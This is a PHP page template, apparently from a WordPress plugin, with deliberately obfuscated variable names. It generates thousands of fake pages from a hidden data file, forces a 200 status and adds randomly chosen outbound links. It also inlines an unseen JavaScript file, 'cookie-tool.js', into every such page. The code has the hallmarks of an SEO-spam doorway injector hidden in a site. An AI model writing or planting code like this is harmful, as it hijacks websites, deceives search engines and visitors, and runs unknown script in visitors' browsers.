<?php
$xbf6EoMz3 = intval(get_query_var('ycptxzwtzl'));

if ($xbf6EoMz3 < 1 || $xbf6EoMz3 > 5036) return;
$zP0fgA = file(plugin_dir_path(__FILE__).'paragraph-this.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$wQ3ex = explode(';', $zP0fgA[$xbf6EoMz3]);
if (count($wQ3ex) < 2) return;
$rwH3S = $wQ3ex[0];
$h9KBz9VXoC  = $wQ3ex[1];
$lcy80IBQ = $wQ3ex[2];
$uEKwtNe71  = $wQ3ex[3];
$hDfFLe = $wQ3ex[4];
set_query_var('pzqrwdurih', $rwH3S);

$pITNrJs = '';
$g8r2v59IM6 = plugin_dir_path(__FILE__).'tracking-thumbnail.php';
if (is_file($g8r2v59IM6)) {
	$zT29DD = file($g8r2v59IM6, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($zT29DD);
	shuffle($zT29DD);
	$udVylR = mt_rand(2, 5);
	if (count($zT29DD) > $udVylR) {
		for ($thqgC = 0; $thqgC < $udVylR; $thqgC++) {
			$uoCETeAe7 = array_shift($zT29DD);
			$pITNrJs .= '<p><a href="'.$uoCETeAe7.'">'.$uoCETeAe7.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $rwH3S; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $h9KBz9VXoC . "</p>\n";
				if (strlen($uEKwtNe71) > 0) echo "<p>" . $uEKwtNe71 . "</p>\n";
				if (strlen($lcy80IBQ) > 0) echo "<p>" . $lcy80IBQ . "</p>\n";
				if (strlen($hDfFLe) > 0) echo '<p><a href="#"><img src="'.$hDfFLe.'"></a>' . "</p>\n";
				echo $pITNrJs;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$nmzpe8JBYX = plugin_dir_path(__FILE__) . 'cookie-tool.js';
if (is_file($nmzpe8JBYX)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($nmzpe8JBYX);
	echo '</script>';
}
get_footer();
?>
